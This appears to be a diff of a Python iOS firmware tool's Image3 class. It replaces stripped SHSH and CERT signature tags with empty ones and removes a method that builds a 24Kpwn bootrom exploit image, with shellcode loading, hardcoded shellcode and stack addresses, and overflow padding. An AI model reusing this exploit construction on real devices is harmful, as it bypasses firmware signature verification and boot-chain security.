@@ -90,31 +90,7 @@ class Image3:
             DWORD1 = 0xea00000e
             DWORD2 = 0xe59ff018
             decrypted = struct.pack('<5I', DWORD1, DWORD2, DWORD2, DWORD2, DWORD2) + decrypted[20:]
-            # Remove SHSH and CERT
-            shshTag = []
-            certTag = []
+            # Add empty SHSH and CERT
+            shshTag = [('SHSH'[::-1], 12, 0, '')]
+            certTag = [('CERT'[::-1], 12, 0, '')]
         return Image3.createImage3FromTags(self.type, typeTag + [(tagMagic, tagTotalSize, tagDataSize, decrypted)] + versTag + bordTag + shshTag + certTag)
-
-    def newDecrypted24KpwnLLB(self, securerom):
-        img3 = self.newDecryptedImage3()
-
-        (old_signed_size,) = struct.unpack('<I', img3[12:16])
-        TOTAL_SIZE = 0x24200
-        DATA_SIZE = 0x241BC
-        SIGNED_SIZE = 0x23FD4
-        img3 = img3[:4] + struct.pack('<3I', TOTAL_SIZE, DATA_SIZE, SIGNED_SIZE) + img3[16:20 + old_signed_size]
-        img3 += struct.pack('4s2I', '24KP'[::-1], 0x24000 - 24 - old_signed_size - 20, 0)
-
-        f = open('bin/24Kpwn-shellcode.bin', 'rb')
-        shellcode = f.read()
-        f.close()
-        MAX_SHELLCODE_LENGTH = 1024
-        assert len(shellcode) <= MAX_SHELLCODE_LENGTH
-
-        SHELLCODE_ADDRESS = 0x84024000 + 1 - 24 - 4 - len(shellcode)
-        payload = shellcode + struct.pack('<I4s2I4s2I', SHELLCODE_ADDRESS, 'SHSH'[::-1], 12, 0, 'CERT'[::-1], 12, 0)
-
-        STACK_ADDRESS = 0x84033E98
-        PADDING_BEFORE = 0x24000 - len(payload) - len(img3)
-        PADDING_AFTER = 0x30
-        return img3 + '\x00' * PADDING_BEFORE + payload + securerom[0xb000:0xb1cc] + struct.pack('<I', STACK_ADDRESS) + '\x00' * PADDING_AFTER
